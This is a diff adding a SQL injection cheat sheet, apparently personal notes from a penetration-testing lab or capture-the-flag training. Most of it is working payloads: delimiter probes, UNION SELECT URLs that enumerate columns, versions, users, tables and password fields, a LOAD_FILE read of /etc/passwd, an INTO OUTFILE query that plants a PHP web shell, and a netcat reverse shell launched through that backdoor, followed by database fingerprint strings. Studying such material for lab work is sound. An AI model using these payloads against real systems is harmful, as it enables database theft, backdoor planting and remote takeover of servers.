@@ -1,0 +1,61 @@
+SQLi
+see:
+xml/queries.xml from sqlmap root
+
+Begin testing by passing delimiters as input
+	COMMON
+'
+--
+#
+;
+''
+	ORACLE (most apply to postgresql)
+[space]
+||
+,
+/*
+.
+"
+'||'
+MSSQL
++
+'+'
+
+enum
+http://10.11.1.35/php.php?var=1 order by 1
+	-upon finding a sqli vulnerable host iteration of order by value can reveal the number of columns
+http://10.11.1.35/php.php?var=1 union select all 1,2,3,5
+	-display each column, potentially with the column number value
+	-union statements allow select statements to be inserted
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,5,6
+	-this syntax unlike select all must have all columns 1-6 selected
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,@@version,6
+	-return mysql version number
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,user(),6
+	-display logged-in user being used for mysql instance connection
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+	-return table information schema
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+	-return schema for a table by name
+	concat(name,0x3a,password)
+		-concatenated values can be placed in the position of a sql columns to display otherwise hidden information in a corresponding html table column
+
+1 UNION ALL SELECT LOAD_FILE('/etc/passwd')--
+http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+	-create a php shell execution script taking an argument 'cmd' from a get request
+http://10.11.1.35/backdoor.php?cmd=nc.exe%20127.0.0.1%204444%20%25windir%25%5Csystem32%5Ccmd.exe
+	-execute a netcat reverse shell from host launching cmd.exe
+	
+fingerprint strings
+ORACLE
+'str'||'ing'
+BITAND(1,1)-BITAND(1,1)
+MSSQL
+'str'+'ing'
+@@PACK_RECIEVED-@@PACK_RECIEVED
+MySQL
+'str' 'ing'
+CONNECTION_ID()-CONNECTION_ID()
+/*!32302 and 1=0*/
+	
+Spun up and compromised to root privilige 50+ virtualized instances of CTF hosts to supplement training
